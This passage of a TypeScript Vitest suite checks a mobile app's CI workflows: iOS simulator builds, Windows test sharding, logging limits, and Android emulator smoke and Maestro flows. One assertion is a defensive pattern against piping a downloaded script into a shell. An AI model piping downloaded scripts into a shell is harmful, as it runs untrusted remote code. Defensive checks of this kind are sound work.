  const runs = (sim?.steps ?? []).map((s) => s.run ?? '');
  const smokeScript = readFileSync(join(ROOT, 'scripts', 'ios-simulator-smoke.sh'), 'utf8');

  it('compiles the iOS project for the simulator on macOS 26 without code signing', () => {
    expect(sim?.['runs-on']).toBe('macos-26');
    const build = runs.find((r) => r.includes('xcodebuild') && r.includes('iphonesimulator') && !r.includes('-version'));
    expect(build).toBeDefined();
    // Ad-hoc ("-") signing, never a real identity: an UNSIGNED simulator app has no entitlements, so the Keychain refuses
    // the database key (run 41268952771: KeychainWrapperError, the app sat on its could-not-open screen).
    expect(build).toContain('CODE_SIGN_IDENTITY=-');
    expect(build).not.toMatch(/CODE_SIGNING_ALLOWED=NO|PROVISIONING_PROFILE|DEVELOPMENT_TEAM=\S/);
    // control: the sync-only job does not compile
    expect(job(ci.wf, 'ios-sync').steps.some((s) => (s.run ?? '').includes('xcodebuild'))).toBe(false);
  });

  it('references no secret, while the release workflow does (so the assertion can fail)', () => {
    expect(sim).toBeDefined();
    expect(secretsIn(sim)).toEqual([]);
    expect(secretsIn(job(ios.wf, 'testflight')).length).toBeGreaterThan(0);
  });

  it('asserts the Xcode major version before it builds', () => {
    const versionAt = runs.findIndex((r) => r.includes('xcodebuild -version') && /-ge 26|>= ?26/.test(r));
    const buildAt = runs.findIndex((r) => r.includes('iphonesimulator'));
    expect(versionAt).toBeGreaterThanOrEqual(0);
    expect(versionAt).toBeLessThan(buildAt);
  });

  it('runs the smoke script on the built app after the build, and keeps its screenshots for 7 days even when it fails', () => {
    const smokeAt = runs.findIndex((r) => r.includes('scripts/ios-simulator-smoke.sh'));
    // A script committed from Windows is not executable in git (the first CI run failed with 'Permission denied'): call it through bash.
    expect(runs[smokeAt]).toMatch(/^bash scripts\/ios-simulator-smoke\.sh /);
    expect(smokeAt).toBeGreaterThan(runs.findIndex((r) => r.includes('iphonesimulator')));
    const upload = (sim?.steps ?? []).find((s) => s.uses?.startsWith('actions/upload-artifact@'));
    expect(upload?.if).toBe('always()');
    expect(upload?.with?.['retention-days']).toBe(7);
    expect(upload?.uses).toMatch(/@[0-9a-f]{40}\b/);
  });

  it('the smoke script checks what the plan promises: manifest, an iPhone and an iPad, URL routing, backup attribute, screenshots', () => {
    for (const needle of ['plutil -lint', 'PrivacyInfo.xcprivacy', 'iPad', 'simctl openurl', 'com_apple_backup_excludeItem', 'storage open failed', 'nothing was captured', 'simctl io', 'screenshot', 'get_app_container']) {
      expect(smokeScript, needle).toContain(needle);
    }
    // The directories it checks come from the Swift source, not from a second copy.
    expect(smokeScript).toContain('BackupExclusion.swift');
    // A check that cannot fail proves nothing: it must also prove the attribute is absent on an untouched directory.
    expect(smokeScript).toMatch(/control/i);
    expect(smokeScript.startsWith('#!/usr/bin/env bash')).toBe(true);
    expect(smokeScript).toContain('set -Eeuo pipefail');
    // The launch keeps its PTY (block-buffered stdout otherwise), now in the library the script sources.
    const lib = readFileSync(join(ROOT, 'scripts', 'lib', 'ios-simulator.sh'), 'utf8');
    expect(lib).toContain('script -q -F "$OUT/${label}.typescript" xcrun simctl launch --console-pty');
  });
});

describe('CI parallelism keeps full coverage', () => {
  const win = job(ci.wf, 'windows') as Job & { strategy?: { matrix?: { shard?: number[] } } };
  const sim = job(ci.wf, 'ios-simulator') as Job & { strategy?: { matrix?: { device?: string[] } } };
  const shards = win.strategy?.matrix?.shard ?? [];
  const shardArg = (run: string | undefined): { index: string; total: number } | undefined => {
    const m = /--shard=\$\{\{ matrix\.shard \}\}\/(\d+)/.exec(run ?? '');
    return m === null ? undefined : { index: 'matrix.shard', total: Number(m[1]) };
  };

  it('Windows is split into N shards and BOTH the unit tests and the Electron end-to-end tests run the same N (no shard count that leaves a slice untested)', () => {
    expect(shards).toEqual([1, 2, 3]);
    const vitest = win.steps.find((s) => (s.run ?? '').startsWith('npx vitest run'));
    const playwright = win.steps.find((s) => (s.run ?? '').includes('playwright test'));
    expect(shardArg(vitest?.run)?.total).toBe(shards.length);
    expect(shardArg(playwright?.run)?.total).toBe(shards.length);
    // Control: the matrix-less steps elsewhere carry no shard flag, so the check can fail.
    expect(shardArg('npx vitest run')).toBeUndefined();
  });

  it('only the first shard does the once-per-run work (type-check, inventory, helper hash and upload)', () => {
    const once = ['npm run typecheck', 'Record Windows HEIF and HEVC codec inventory', 'Record the helper SHA-256', 'windows-heic-helper'];
    for (const needle of once) {
      const found = win.steps.find((s) => (s.run ?? '') === needle || s.name === needle || s.with?.name === needle);
      expect(found, needle).toBeDefined();
      expect(found?.if, needle).toBe('matrix.shard == 1');
    }
    // Control: the build and the end-to-end run happen on every shard, since each shard runs on its own machine.
    const everywhere = win.steps.filter((s) => (s.run ?? '').includes('npm run build:electron') || (s.run ?? '').includes('playwright test'));
    expect(everywhere.length).toBeGreaterThanOrEqual(2);
    for (const s of everywhere) expect(s.if).toBeUndefined();
  });

  it('the simulator job runs one device per matrix leg and passes it to the script; artifacts and failure context cannot collide', () => {
    expect(sim.strategy?.matrix?.device).toEqual(['iphone', 'ipad']);
    const smoke = sim.steps.find((s) => (s.run ?? '').includes('ios-simulator-smoke.sh'));
    expect(smoke?.env?.SMOKE_DEVICES).toBe('${{ matrix.device }}');
    const upload = sim.steps.find((s) => s.uses?.startsWith('actions/upload-artifact@'));
    expect(String(upload?.with?.name)).toContain('${{ matrix.device }}');
    const failureUpload = win.steps.find((s) => s.if === 'failure()');
    expect(String(failureUpload?.with?.name)).toContain('${{ matrix.shard }}');
  });

  it('the Swift package cache is keyed on what decides the packages and is pinned to a full SHA', () => {
    const cache = sim.steps.find((s) => s.uses?.startsWith('actions/cache@'));
    expect(cache?.uses).toMatch(/@[0-9a-f]{40}\b/);
    expect(String(cache?.with?.key)).toContain("hashFiles('ios/App/CapApp-SPM/Package.swift', 'package-lock.json')");
    const cacheAt = sim.steps.indexOf(cache as Step);
    const buildAt = sim.steps.findIndex((s) => (s.run ?? '').includes('iphonesimulator'));
    expect(cacheAt).toBeGreaterThanOrEqual(0);
    expect(cacheAt).toBeLessThan(buildAt);
  });
});

describe('native logging stays off outside the simulator job', () => {
  const setsLogging = (text: string): boolean => text.includes('OI_NATIVE_LOGGING');

  it('no release workflow can turn Capacitor logging on (it prints plugin calls: secure-store keys and values, callback URLs)', () => {
    for (const [name, workflow] of [['android', android], ['ios', ios], ['windows', windows]] as const) expect(setsLogging(workflow.text), name).toBe(false);
    // Control: the CI file does mention it, so the check can fail.
    expect(setsLogging(ci.text)).toBe(true);
  });

  it('in CI only the simulator job sets it, on the sync step, and the smoke script requires proof that the console is visible', () => {
    for (const [id, j] of Object.entries(ci.wf.jobs)) {
      const setting = j.steps.filter((s) => s.env?.OI_NATIVE_LOGGING !== undefined);
      if (id === 'ios-simulator') {
        expect(setting).toHaveLength(1);
        expect(setting[0]?.run).toBe('npx cap sync ios');
        expect(setting[0]?.env?.OI_NATIVE_LOGGING).toBe('debug');
      } else {
        expect(setting, id).toHaveLength(0);
      }
    }
    expect(readFileSync(join(ROOT, 'scripts', 'ios-simulator-smoke.sh'), 'utf8')).toContain("grep -q 'To Native'");
  });

  it('the smoke script reads the gallery prerequisites from the BUILT app, with a control that must fail', () => {
    const script = readFileSync(join(ROOT, 'scripts', 'ios-simulator-smoke.sh'), 'utf8');
    expect(script).toContain('plutil -extract NSPhotoLibraryAddUsageDescription raw');
    expect(script).toContain('"$APP_PATH/Info.plist"');
    expect(script).toContain('"$APP_PATH/capacitor.config.json"');
    expect(script).toContain('registered_plugin "MediaPlugin"');
    // the control comes first and is expected NOT to be found
    expect(script.indexOf('registered_plugin "NoSuchPluginForTheControl"')).toBeGreaterThan(-1);
    expect(script.indexOf('registered_plugin "NoSuchPluginForTheControl"')).toBeLessThan(script.indexOf('registered_plugin "MediaPlugin"'));
  });

  it('the iOS job makes sure GNU timeout exists before the smoke script runs (macOS has none; the library bounds every simulator call with it)', () => {
    const steps = ci.wf.jobs['ios-simulator']!.steps;
    const smokeAt = steps.findIndex((s) => (s.run ?? '').includes('ios-simulator-smoke.sh'));
    const timeoutAt = steps.findIndex((s) => (s.run ?? '').includes('brew install coreutils'));
    expect(smokeAt).toBeGreaterThan(-1);
    expect(timeoutAt).toBeGreaterThan(-1);
    expect(timeoutAt).toBeLessThan(smokeAt);
    // Only installed when neither name is there already, and the library looks for both names.
    expect(steps[timeoutAt]!.run).toMatch(/command -v timeout \|\| command -v gtimeout \|\| brew install coreutils/);
    // The library tries both names and accepts only a GNU one (on Windows a bare `timeout` can be System32's pause program).
    const library = readFileSync(join(ROOT, 'scripts', 'lib', 'ios-simulator.sh'), 'utf8');
    expect(library).toContain('for candidate in timeout gtimeout');
    expect(library).toMatch(/\*GNU\* \| \*coreutils\*/);
  });

  it('boots and launches through the tested library, and keeps no second, untested copy of those functions in the script', () => {
    // What boot_simulator, simulator_answers, bootstatus_bounded and launch_app DO is checked by running them against a stubbed xcrun
    // (scripts/lib/ios-simulator.test.ts); a text match here could not tell a right implementation from a wrong one with the same words.
    const script = readFileSync(join(ROOT, 'scripts', 'ios-simulator-smoke.sh'), 'utf8');
    const lib = readFileSync(join(ROOT, 'scripts', 'lib', 'ios-simulator.sh'), 'utf8');
    expect(script).toContain('lib/ios-simulator.sh');
    for (const fn of ['app_is_running', 'boot_simulator', 'simulator_answers', 'bootstatus_bounded', 'launch_app']) {
      expect(lib, fn).toMatch(new RegExp(`^${fn}\\(\\) \\{`, 'm'));
      expect(script, fn).not.toMatch(new RegExp(`^${fn}\\(\\) \\{`, 'm'));
    }
    const device = script.slice(script.indexOf('smoke_device() {'));
    expect(device).toContain('boot_simulator "$label" "$udid"');
    expect(device).toContain('launch_app "$label" "$udid"');
    // The checks that the app is STILL running ask for a time window, not a single probe (a slow or stopped probe is not a dead app).
    expect(device).toContain('wait_for_app "$udid"');
    expect(device).not.toMatch(/if ! app_is_running|app_is_running "\$udid" \|\|/);
    // The library is sourced after fail() exists (it calls it) and before smoke_device runs.
    expect(script.indexOf('fail() {')).toBeLessThan(script.indexOf('lib/ios-simulator.sh'));
    expect(script.indexOf('lib/ios-simulator.sh')).toBeLessThan(script.indexOf('smoke_device() {'));
    // The check after the settle time still decides the verdict, with the app's own message.
    expect(script).toContain('seconds after launch');
    // The test that runs them is there and can run (the driver and the library exist next to it).
    expect(readFileSync(join(ROOT, 'scripts', 'lib', 'fixtures', 'ios-simulator-driver.sh'), 'utf8')).toContain('. "$LIB"');
  });
});

describe('Android emulator smoke workflow', () => {
  const emu = load('android-emulator');
  const emuJob = job(emu.wf, 'android-emulator');
  const script = readFileSync(join(ROOT, 'scripts', 'android-emulator-smoke.sh'), 'utf8');

  it('uses no secret, builds only the debug APK, and pins every action to a full commit SHA', () => {
    expect(secretsIn(emu.wf)).toEqual([]);
    expect(emuJob.steps.some((s) => (s.run ?? '').includes('assembleDebug'))).toBe(true);
    expect(emuJob.steps.some((s) => (s.run ?? '').includes('assembleRelease'))).toBe(false);
    for (const s of emuJob.steps) if (s.uses !== undefined) expect(s.uses, s.uses).toMatch(/@[0-9a-f]{40}\b/);
    // Control: the workflow really holds third-party actions, so the pin check had something to fail on.
    expect(emuJob.steps.some((s) => s.uses?.startsWith('reactivecircus/android-emulator-runner@'))).toBe(true);
  });

  it('runs the smoke script on the BUNDLED debug APK it built first, and keeps the evidence for 7 days even when it fails', () => {
    const runner = emuJob.steps.find((s) => s.uses?.startsWith('reactivecircus/android-emulator-runner@'));
    expect(String(runner?.with?.script)).toContain('bash scripts/android-emulator-smoke.sh "$RUNNER_TEMP/apk/app-debug-bundled.apk"');
    // The bundled copy is taken straight after the first Gradle build, before anything is synced for the dev server.
    const names = emuJob.steps.map((s) => s.name ?? '');
    const firstBuild = names.indexOf('Build the debug APK (bundled assets)');
    const keep = names.indexOf('Keep the bundled APK for the launch smoke');
    expect(firstBuild).toBeGreaterThanOrEqual(0);
    expect(keep).toBe(firstBuild + 1);
    expect(emuJob.steps[keep]?.run).toContain('cp android/app/build/outputs/apk/debug/app-debug.apk "$RUNNER_TEMP/apk/app-debug-bundled.apk"');
    const upload = emuJob.steps.find((s) => s.uses?.startsWith('actions/upload-artifact@'));
    expect(upload?.if).toBe('always()');
    expect(upload?.with?.['retention-days']).toBe(7);
  });

  it('reads the UI tree more than once: the first dump can hold only the native shell (run 41295240990: 7 nodes and no text, while the screenshot showed the screen)', () => {
    // The DEFAULT budget stays generous (a test may set fewer, through SMOKE_UI_ATTEMPTS, to keep a whole-script run short), and the loop uses it.
    const budget = /MAX_UI_ATTEMPTS="\$\{SMOKE_UI_ATTEMPTS:-(\d+)\}"/.exec(script);
    expect(Number(budget?.[1])).toBeGreaterThanOrEqual(10);
    expect(script).toContain('until [ "$attempts" -ge "$MAX_UI_ATTEMPTS" ]');
    // The retry sits around the dump itself, and the checks on its result come after it.
    expect(script.indexOf('until [ "$attempts"')).toBeLessThan(script.indexOf('uiautomator dump'));
    expect(script.indexOf('uiautomator dump')).toBeLessThan(script.indexOf('after $attempts attempts'));
  });

  it('the script checks what it claims: the process, the first screen, no could-not-open screen, no crash, and keeps evidence', () => {
    for (const needle of ['set -Eeuo pipefail', 'pidof', 'uiautomator dump', 'Choose your server', 'could not open', 'FATAL EXCEPTION', 'screencap', 'logcat']) {
      expect(script, needle).toContain(needle);
    }
    // A UI tree of some other window would make the screen check meaningless, so the script checks the package first.
    expect(script).toContain('package=\\"$APP_ID\\"');
    expect(script.startsWith('#!/usr/bin/env bash')).toBe(true);
  });

  it('the launch smoke stands alone: its script knows nothing of the dev server, Maestro or the fake engine', () => {
    for (const needle of ['devserver', 'maestro', 'fake-engine', '10.0.2.2', 'OI_EMULATOR_DEV_SERVER']) expect(script.toLowerCase(), needle).not.toContain(needle.toLowerCase());
  });
});

describe('Android emulator golden flow G2 (dev-server build, fake engine, Maestro)', () => {
  const emu = load('android-emulator');
  const emuJob = job(emu.wf, 'android-emulator');
  const golden = readFileSync(join(ROOT, 'scripts', 'android-emulator-golden.sh'), 'utf8');
  const DEV_SERVER = 'http://localhost:5173'; // the emulator's own loopback via adb reverse: a secure context, which crypto.randomUUID needs
  const indexOfStep = (name: string): number => {
    const at = emuJob.steps.findIndex((s) => s.name === name);
    if (at < 0) throw new Error(`no step named ${name}`);
    return at;
  };
  const runnerAt = emuJob.steps.findIndex((s) => s.uses?.startsWith('reactivecircus/android-emulator-runner@'));

  it('only this workflow can point the WebView at a dev server, and only on the second sync; no CI or release workflow mentions the switch', () => {
    const sets = (text: string): boolean => text.includes('OI_EMULATOR_DEV_SERVER');
    for (const [name, workflow] of [['ci', ci], ['android', android], ['ios', ios], ['windows', windows]] as const) expect(sets(workflow.text), name).toBe(false);
    // Control: this workflow does set it, so the check above could have failed.
    expect(sets(emu.text)).toBe(true);
    const setting = emuJob.steps.filter((s) => s.env?.OI_EMULATOR_DEV_SERVER !== undefined);
    expect(setting).toHaveLength(1);
    expect(setting[0]?.env?.OI_EMULATOR_DEV_SERVER).toBe(DEV_SERVER);
    expect(setting[0]?.run).toBe('npx cap sync android');
    expect(Object.keys(emu.wf.env ?? {})).not.toContain('OI_EMULATOR_DEV_SERVER');
    expect(Object.keys(emuJob.env ?? {})).not.toContain('OI_EMULATOR_DEV_SERVER');
    // Order: bundled build and its copy, then the switched sync, then the second build and its copy.
    const order = ['Build the debug APK (bundled assets)', 'Keep the bundled APK for the launch smoke', 'Sync again for the dev-server build (golden flows)', 'Build the debug APK (WebView loads the Vite dev server)', 'Keep the dev-server APK for the golden flows'].map(indexOfStep);
    expect([...order].sort((a, b) => a - b)).toEqual(order);
    expect(emuJob.steps[order[2] ?? 0]).toBe(setting[0]);
    // The plain sync before it carries no env at all.
    const plainSync = emuJob.steps.find((s) => s.run === 'npx cap sync android');
    expect(plainSync?.env).toBeUndefined();
    expect(emuJob.steps.indexOf(plainSync as Step)).toBeLessThan(order[0] ?? 0);
    expect(emuJob.steps.some((s) => (s.run ?? '').includes('assembleRelease'))).toBe(false);
  });

  it('starts the fake engine and Vite on loopback before the emulator, allows exactly the dev-server origin, and waits for both', () => {
    const start = emuJob.steps[indexOfStep('Start the fake engine and the Vite dev server on the runner')];
    const run = start?.run ?? '';
    expect(run).toContain(`node e2e/fake-engine/serve.mjs --host 127.0.0.1 --port 8791 --allow-origin ${DEV_SERVER}`);
    expect(run).toContain('npx vite --host 127.0.0.1 --port 5173 --strictPort');
    expect(run).not.toContain('0.0.0.0');
    expect(run).toContain('curl -fsS http://127.0.0.1:8791/api/client/compat');
    expect(run).toContain('curl -fsS http://127.0.0.1:5173/src/main.tsx');
    expect(run).toContain('exit 1');
    expect(indexOfStep('Start the fake engine and the Vite dev server on the runner')).toBeLessThan(runnerAt);
    // The port in the allow-list and the one Vite serves are the one the config switch names.
    expect(new URL(DEV_SERVER).port).toBe('5173');
  });

  it('installs Maestro from a pinned release and refuses it when the checksum does not match, before unpacking', () => {
    expect(emuJob.env?.MAESTRO_VERSION).toMatch(/^\d+\.\d+\.\d+$/);
    expect(emuJob.env?.MAESTRO_SHA256).toMatch(/^[0-9a-f]{64}$/);
    const run = emuJob.steps[indexOfStep('Install Maestro (pinned release, checksum verified)')]?.run ?? '';
    expect(run).toContain('set -eu');
    expect(run).toContain('releases/download/cli-${MAESTRO_VERSION}/maestro.zip');
    expect(run).toContain('--retry 3 --retry-all-errors'); // a 350 MB download over a flaky link
    expect(run).toContain('sha256sum -c -');
    expect(run.indexOf('sha256sum -c -')).toBeLessThan(run.indexOf('unzip'));
    expect(run).not.toMatch(/\|\s*(ba)?sh\b/); // never a downloaded script piped into a shell
    expect(indexOfStep('Install Maestro (pinned release, checksum verified)')).toBeLessThan(runnerAt);
  });

  it('runs G2 on the dev-server APK after the launch smoke, in the same emulator session, with no guard that could skip it', () => {
    const lines = String(emuJob.steps[runnerAt]?.with?.script).split('\n').map((l) => l.trim()).filter((l) => l !== '');
    // Four lines now: the launch smoke, G2, G3 + G4 and G5 (it was three before G5; each line is one script run, so the count is exact).
    expect(lines).toHaveLength(4);
    expect(lines[0]).toContain('scripts/android-emulator-smoke.sh');
    expect(lines[1]).toBe('bash scripts/android-emulator-golden.sh "$RUNNER_TEMP/apk/app-debug-devserver.apk" http://localhost:8791 "$RUNNER_TEMP/android-smoke/g2"');
    // G3 and G4 follow G2 in the same session, on their own engine (port 8792, the inspection scenario) whose control url the workflow wrote down.
    expect(lines[2]).toBe('bash scripts/android-emulator-offline-photo.sh "$RUNNER_TEMP/apk/app-debug-devserver.apk" http://localhost:8792 "$(cat "$RUNNER_TEMP/android-smoke/g3-control-url")" "$RUNNER_TEMP/android-smoke/g3"');
    // G5 comes last, on its own third engine (port 8793, the published scenario) whose control url the workflow wrote down in its own file.
    expect(lines[3]).toBe('bash scripts/android-emulator-published.sh "$RUNNER_TEMP/apk/app-debug-devserver.apk" http://localhost:8793 "$(cat "$RUNNER_TEMP/android-smoke/g5-control-url")" "$RUNNER_TEMP/android-smoke/g5"');
    expect(lines.at(-1)).toBe(lines[3]);
    // A missing APK must fail the job, never skip a flow.
    for (const line of lines.slice(1)) expect(line).not.toMatch(/\[ !? -f|\|\||if /);
    // The fake engine is reached at the emulator's localhost (adb reverse in the golden script), on the port the workflow started it on.
    const engines = String(emuJob.steps[indexOfStep('Start the fake engine and the Vite dev server on the runner')]?.run);
    expect(engines).toContain('--port 8791');
    expect(engines).toMatch(/--port 8792 --scenario inspection --allow-origin http:\/\/localhost:5173/);
    // The third engine: G5's published report, with its log and control url apart from G3's, and waited for like the others.
    expect(engines).toContain('--port 8793 --scenario published --allow-origin http://localhost:5173 > "$RUNNER_TEMP/android-smoke/fake-engine-g5.log"');
    expect(engines).toContain('curl -fsS http://127.0.0.1:8793/api/client/compat');
    expect(engines).toContain('> "$RUNNER_TEMP/android-smoke/g5-control-url"');
    expect(engines.split('--scenario published')).toHaveLength(2); // exactly one engine runs it
    expect(engines).toContain('> "$RUNNER_TEMP/android-smoke/g3-control-url"'); // G3's own file is still written
    expect(engines).not.toContain('0.0.0.0');
    // The three engines use three different ports (and Vite its own, 5173).
    expect(new Set(engines.match(/--port [0-9]+/g))).toEqual(new Set(['--port 5173', '--port 8791', '--port 8792', '--port 8793']));
    // The step's display name names G5 too.
    expect(String(emuJob.steps[runnerAt]?.name)).toContain('G5');
  });

  it('both emulator scripts deal with a system "isn\'t responding" dialog instead of failing on it', () => {
    // CI run 41367506059: "Pixel Launcher isn't responding" sat in front of a healthy app and the launch smoke read that dialog 15 times.
    const smoke = readFileSync(join(ROOT, 'scripts', 'android-emulator-smoke.sh'), 'utf8');
    const helper = readFileSync(join(ROOT, 'scripts', 'lib', 'dismiss-not-responding.sh'), 'utf8');
    // The helper only ever taps the Wait button, found by its resource id (the label is localised).
    expect(helper).toContain('android:id/aerr_wait');
    expect(helper).not.toContain('aerr_close');
    for (const [name, text] of [['smoke', smoke], ['golden', golden]] as const) {
      expect(text, name).toContain('lib/dismiss-not-responding.sh');
      expect(text, name).toContain('dismiss_not_responding');
    }
    // In the smoke loop the dialog is checked BEFORE the app's own text, and the loop goes round again after a tap.
    const loop = smoke.slice(smoke.indexOf('until [ "$attempts" -ge "$MAX_UI_ATTEMPTS" ]'));
    expect(loop.indexOf('dismiss_not_responding')).toBeGreaterThan(0);
    expect(loop.indexOf('dismiss_not_responding')).toBeLessThan(loop.indexOf('Choose your server'));
    expect(loop).toMatch(/dismiss_not_responding "\$OUT\/ui\.xml"; then[\s\S]*?continue/);
    // The golden flow checks before Maestro starts and never while it runs: two uiautomator clients at once is what crashed UiAutomation.
    expect(golden.indexOf('dismiss_not_responding "$OUT/ui-preflight.xml"')).toBeGreaterThan(0);
    expect(golden.indexOf('dismiss_not_responding "$OUT/ui-preflight.xml"')).toBeLessThan(golden.indexOf('maestro --device'));
    // A dialog that would come up LATER, while Maestro runs and nothing may look at the screen, is prevented: error dialogs are hidden
    // before the app is started (a crash of the app is still found by the logcat check).
    expect(golden).toContain('settings put global hide_error_dialogs 1');
    expect(golden.indexOf('settings put global hide_error_dialogs 1')).toBeLessThan(golden.indexOf('start_app "Choose your server"'));
    // After the loop, a last press is followed by one more look, so the checks read the screen and not the dialog that was pressed.
    const after = smoke.slice(smoke.indexOf('until [ "$attempts" -ge "$MAX_UI_ATTEMPTS" ]'));
    expect(after).toContain('dismissed=1');
    expect(after.indexOf('if [ "$dismissed" -eq 1 ]')).toBeGreaterThan(after.indexOf('done'));
    expect(after.indexOf('if [ "$dismissed" -eq 1 ]')).toBeLessThan(after.indexOf('UI tree read in'));
  });

  it('both emulator scripts count only a crash of the APP process, not a FATAL EXCEPTION logged by the test tooling', () => {
    // CI run 41321526977 went red on a FATAL EXCEPTION whose process was UiAutomation (the accessibility channel behind
    // uiautomator dump) while the app sat on its first screen. A crash of the app names the package on its Process: line.
    const smoke = readFileSync(join(ROOT, 'scripts', 'android-emulator-smoke.sh'), 'utf8');
    for (const [name, text] of [['smoke', smoke], ['golden', golden]] as const) {
      expect(text, name).toContain('grep -A3 "FATAL EXCEPTION" "$OUT/logcat.txt" | grep -q "Process: $APP_ID"');
      // Not the old, wider check that any FATAL EXCEPTION fails the run.
      expect(text, name).not.toMatch(/^if grep -q "FATAL EXCEPTION" "\$OUT\/logcat\.txt"; then$/m);
      // A crash of another process is still visible in the log output.
      expect(text, name).toContain('a FATAL EXCEPTION of another process is in logcat.txt');
    }
  });

  it('the golden script starts the app from a cleared state with the shared screen-aware launcher, then runs G2 with the engine address', () => {
    expect(golden.startsWith('#!/usr/bin/env bash')).toBe(true);
    for (const needle of ['set -Eeuo pipefail', 'FATAL EXCEPTION', 'screencap', 'logcat', 'uiautomator dump', 'maestro/golden/g2-controlled-sign-in.yaml', '-e "SERVER_URL=$ENGINE_ORIGIN"']) expect(golden, needle).toContain(needle);
    // The emulator's localhost is made to reach the runner: without these two the WebView and the app would find nothing on it.
    const reverseVite = golden.indexOf('adb reverse tcp:5173 tcp:5173');
    const reverseEngine = golden.indexOf('adb reverse tcp:8791 tcp:8791');
    expect(reverseVite).toBeGreaterThan(0);
    expect(reverseEngine).toBeGreaterThan(0);
    expect(golden).not.toContain('10.0.2.2');
    const clear = golden.indexOf('adb shell pm clear "$APP_ID"');
    const start = golden.indexOf('start_app "Choose your server"');
    const flow = golden.indexOf('maestro --device "$serial" test');
    const launcher = readFileSync(join(ROOT, 'scripts', 'lib', 'android-start-app.sh'), 'utf8');
    expect(clear).toBeGreaterThan(Math.max(reverseVite, reverseEngine));
    expect(start).toBeGreaterThan(clear);
    expect(flow).toBeGreaterThan(start);
    expect(launcher).toContain('adb shell am start -n "$APP_ID/io.inspectorhub.app.MainActivity"');
    expect(launcher).toContain('wait_for_screen_text "$pattern"');
    // Maestro never launches the app itself: the flow file names the app id but has no launchApp step.
    expect(readFileSync(join(ROOT, 'maestro', 'golden', 'g2-controlled-sign-in.yaml'), 'utf8')).not.toContain('launchApp');
    // No credential, token or account is typed or passed by the script.
    expect(golden).not.toMatch(/PASSWORD|E2E_EMAIL|secrets\./);
  });
});

describe('Android emulator golden flows G3 and G4 (offline photo, restart, upload, thumbnail)', () => {
  const g3 = readFileSync(join(ROOT, 'scripts', 'android-emulator-offline-photo.sh'), 'utf8');
  const flowA = readFileSync(join(ROOT, 'maestro', 'golden', 'g3-a-offline-photo.yaml'), 'utf8');
  const flowB = readFileSync(join(ROOT, 'maestro', 'golden', 'g3-b-after-restart.yaml'), 'utf8');
  // The steps only: a comment may name what a step does not do (this file mentions g2-controlled-sign-in.yaml to say why Maestro never launches the app).
  const stepsOf = (text: string): string => text.split(/\r?\n/).filter((line) => !line.trim().startsWith('#')).join('\n');
  const stepsB = stepsOf(flowB);

  it('the engine goes off in part A BEFORE the photo is added, and the script proves nothing reached it before the restart', () => {
    const off = flowA.indexOf('UNAVAILABLE: "true"');
    expect(off).toBeGreaterThan(0);
    expect(off).toBeLessThan(flowA.indexOf('tapOn: "Add photo"'));
    expect(flowA.indexOf('tapOn: "Add photo"')).toBeLessThan(flowA.indexOf('Add from library'));
    expect(flowA.indexOf('visible: "Add media"')).toBeGreaterThan(flowA.indexOf('tapOn: "Add photo"'));
    expect(flowA.indexOf('visible: "Add media"')).toBeLessThan(flowA.indexOf('tapOn: "Add from library"'));
    const photoSelected = flowA.indexOf('text: "Photo taken on.*"');
    const selectedScreenshot = flowA.indexOf('path: g3-photo-selected', photoSelected);
    const confirmation = flowA.indexOf("text: 'Done|Add", selectedScreenshot);
    const uploading = flowA.indexOf('visible: "UPLOADING"', confirmation);
    expect(photoSelected).toBeGreaterThan(0);
    expect(selectedScreenshot).toBeGreaterThan(photoSelected);
    expect(confirmation).toBeGreaterThan(selectedScreenshot);
    expect(uploading).toBeGreaterThan(confirmation);
    expect(g3).toContain('--test-output-dir "$OUT/maestro-a-files"');
    // The picture is in the media index (checked by a query, not a sleep) before Maestro starts: Maestro's addMedia raced the index on API 34.
    expect(stepsOf(flowA)).not.toContain('addMedia'); // the comment may name it, a step may not
    const pushed = g3.indexOf('adb push maestro/fixtures/roof-photo.jpg');
    const queried = g3.indexOf('content query --uri content://media/external/images/media');
    const startedA = g3.indexOf('timeout 900 maestro --device "$serial" test -e "SERVER_URL');
    expect(pushed).toBeGreaterThan(0);
    expect(queried).toBeGreaterThan(pushed);
    expect(startedA).toBeGreaterThan(queried);
    expect(g3).toContain('fail "the media index does not list roof-photo.jpg ($fixture_size bytes) after 60 s"');
    // Two none-uploaded checks (after A, after B) both come before the engine is switched on and before the one-uploaded wait.
    const none = [...g3.matchAll(/engine-state\.mjs" "\$CONTROL_URL" none-uploaded/g)].map((m) => m.index ?? -1);
    expect(none).toHaveLength(2);
    const on = g3.indexOf('set_engine false\nnode');
    expect(on).toBeGreaterThan(none[1] ?? Infinity);
    expect(g3.indexOf('one-uploaded 420 15')).toBeGreaterThan(on); // the wait covers the app's retry backoff, then watches for a second copy
  });

  it('records the WebView console for the whole run: started before the app, a page snapshot on failure, stopped on failure and on exit', () => {
    const started = g3.indexOf('webview-console.mjs" collect "$OUT/webview-console.jsonl" &');
    expect(started).toBeGreaterThan(g3.indexOf('adb install -r "$APK"'));
    expect(started).toBeLessThan(g3.indexOf('start_app "Choose your server"'));
    expect(g3).toContain('trap stop_console EXIT');
    const onError = g3.slice(g3.indexOf('on_error() {'), g3.indexOf('trap on_error ERR'));
    // The snapshot is taken while the recorder still runs, then the recorder is stopped and its tail is printed into the job log.
    expect(onError.indexOf('webview-console.mjs" snapshot')).toBeGreaterThan(0);
    expect(onError.indexOf('stop_console')).toBeGreaterThan(onError.indexOf('webview-console.mjs" snapshot'));
    expect(onError.indexOf('tail -40 "$OUT/webview-console.jsonl"')).toBeGreaterThan(onError.indexOf('stop_console'));
  });

  it('kills the app between the parts and starts it again, and part B sees the work list first (a restart really happened)', () => {
    const killAt = g3.indexOf('adb shell am force-stop "$APP_ID"');
    expect(killAt).toBeGreaterThan(0);
    // The real invocations (the lines that run Maestro), not the header comment that names the same files.
    const lines = g3.split(/\r?\n/);
    const lineOf = (flow: string): number => lines.findIndex((line) => line.includes('maestro --device') && line.includes(flow));
    const kill = lines.findIndex((line) => line.startsWith('adb shell am force-stop'));
    expect(lineOf('g3-a-offline-photo.yaml')).toBeGreaterThan(0);
    expect(kill).toBeGreaterThan(lineOf('g3-a-offline-photo.yaml'));
    expect(lineOf('g3-b-after-restart.yaml')).toBeGreaterThan(kill);
    expect(g3.indexOf('pidof "$APP_ID"', killAt)).toBeGreaterThan(killAt); // it checks the process is gone
    // Part B does not clear the app and does not sign in again: what it sees was kept by the app itself.
    expect(g3.slice(killAt)).not.toContain('pm clear');
    expect(stepsB).not.toContain('g2-controlled-sign-in');
    expect(stepsB).not.toContain('clearState');
    expect(stepsB).not.toContain('launchApp');
  });

